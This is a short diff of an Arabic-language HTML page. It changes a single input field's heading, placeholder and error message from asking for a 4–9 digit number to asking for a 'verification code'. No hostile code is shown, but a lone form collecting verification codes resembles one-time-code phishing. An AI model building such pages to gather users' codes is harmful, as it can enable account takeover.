@@ -39,11 +39,11 @@
 
   <main>
     <div class="box" role="region" aria-labelledby="title">
-      <h3 id="title">أدخل رقم (4–9 أرقام)</h3>
+      <h3 id="title">أدخل رقم (التحقق)</h3>
 
       <!-- الحقل الوحيد المتوافق مع طلبك -->
       <input id="onlyNumber" inputmode="numeric" autocomplete="off"
-             placeholder="أدخل 4 إلى 9 أرقام فقط" maxlength="9" aria-describedby="hint" />
+             placeholder="أدخل رمز التحقق" maxlength="9" aria-describedby="hint" />
 
       <button id="sendBtn" type="button">إرسال</button>
 
@@ -76,7 +76,7 @@
     btn.addEventListener('click', async () => {
       const val = input.value.trim();
       if (!validLength(val)) {
-        alert('الرجاء إدخال رقم صالح مكوَّن من 4 إلى 9 أرقام.');
+        alert('الرجاء إدخال رمز التحقق        .');
         input.focus();
         return;
       }
